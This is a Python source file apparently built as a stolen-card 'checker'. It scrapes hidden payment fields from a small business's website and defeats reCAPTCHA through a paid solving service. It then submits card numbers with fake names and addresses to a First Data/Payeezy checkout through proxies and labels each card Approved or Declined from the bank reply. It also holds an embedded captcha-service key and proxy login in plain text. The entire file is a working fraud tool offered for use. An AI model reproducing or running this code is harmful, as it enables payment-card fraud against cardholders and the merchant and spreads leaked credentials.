from httpx import AsyncClient
from faker import Faker

async def addressnot(cc,mes,ano,cvv,proxyg,amount='35'):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        fake = Faker()
        NEXTCAPTCHA_KEY = "next_e4187cce3a57286399989a1f27032e488e"

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            # 'Cookie': 'e9e1e3bd8763a5761496e1d32c67635a=8caa8ppm4oosdsi49urfoc81c1; _ga=GA1.2.1611364213.1737623228; _gid=GA1.2.354393906.1737623228; _gat=1',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        req1 = await web.get('https://www.masterspestandtermite.com/', headers=headers)

        xhash = req1.text.split('name="x_fp_hash" type="hidden" value="')[1].split('"')[0]
        xlogin = req1.text.split('name="x_login" type="hidden" value="')[1].split('"')[0]
        xsecuence = req1.text.split('name="x_fp_sequence" type="hidden" value="')[1].split('"')[0]


        json_data = {
            "clientKey": NEXTCAPTCHA_KEY,
            "task": {
                "type": "RecaptchaV2EnterpriseTask",
                "websiteURL": "https://checkout.globalgatewaye4.firstdata.com",
                "websiteKey": "6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y",
                "proxyType":"socks5", 
                "proxyAddress":"148.251.5.30",
                "proxyPort":824,
                "proxyLogin":"fda3202328e555889b35",
                "proxyPassword":"4966922f8b8e8f86"
            }
        }

        gg = await web.post('https://api.nextcaptcha.com/createTask', json=json_data)

        rcap = gg.text
        taskid = rcap.split('"taskId":')[1].split(',')[0]

        captcha = None
        while not captcha:

            
            json_data = {
                "clientKey": NEXTCAPTCHA_KEY,
                "taskId": int(taskid)
            }
            
            gg = await web.post('https://api.nextcaptcha.com/getTaskResult', json=json_data)
            rcap2 = gg.text

            if '"status":"ready"' in rcap2:
                
                captcha = rcap2.split('"gRecaptchaResponse":"')[1].split('"')[0]
        if captcha:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'hcorequestsource': 'CloverHCO',
                'origin': 'https://checkout.globalgatewaye4.firstdata.com',
                'priority': 'u=1, i',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'cc_expiry': f"{mes}{ano[2:]}",
                'cardholder_name': fake.name(),
                'cc_number': cc,
                'cvv': '',
                'customerEmail': '',
                'paymentType': 'payNowDonateNow',
                'customerFirstName': '',
                'customerLastName': '',
                'tax1_amount': '',
                'customer_ref': '',
                'zip': '10010',
                'password': '',
                'transaction_type': '00',
                'xlogin': xlogin,
                'gateway_id': '',
                'split_tender_id': '',
                'language': 'en',
                'hashKey': xhash,
                'amount': amount,
                'recurringPlanId': '',
                'recurringPlanName': '',
                'recurringAmount': '',
                'recurringActive': '',
                'recurringInterval': '',
                'recurringIntervalCount': '',
                'recurringMerchantId': '',
                'recurringDeveloperAppId': '',
                'recurringSubscriptionCount': '',
                'recurringActiveSubscriptionCount': '',
                'recurringStartDate': '',
                'recurringEndDate': '',
                'recaptchaToken': captcha,
                'address': {
                    'address1': fake.street_address(),
                    'city': fake.city(),
                    'state': fake.state(),
                    'country_code': 'US',
                    'zip': fake.zipcode(),
                },
                'cvd_presence_indicator': '9',
            }

            req3 = await web.post('https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1',headers=headers,json=json_data,)
            print(req3.text)
            if 'transaction_approved:true' in req3.text:
                status = "Approved ✅"
                mensaje = "Charged $50"
            elif "Card Volume Exceeded" in req3.text:
                status = "Declined ❌"
                mensaje = "Card Volume Exceeded"
            else:
                bank_message = req3.text.split('"bank_message":"')[1].split('"')[0]
                bank_resp_code = req3.text.split('"bank_resp_code":"')[1].split('"')[0]
                
                mensaje = f'{bank_message} - {bank_resp_code}'
                
                if "Approved" in mensaje:
                    status = "Approved ✅"
                    mensaje = "Address Not Verified - Approved (100)"
                elif "302" in mensaje:
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"
            
            return status,mensaje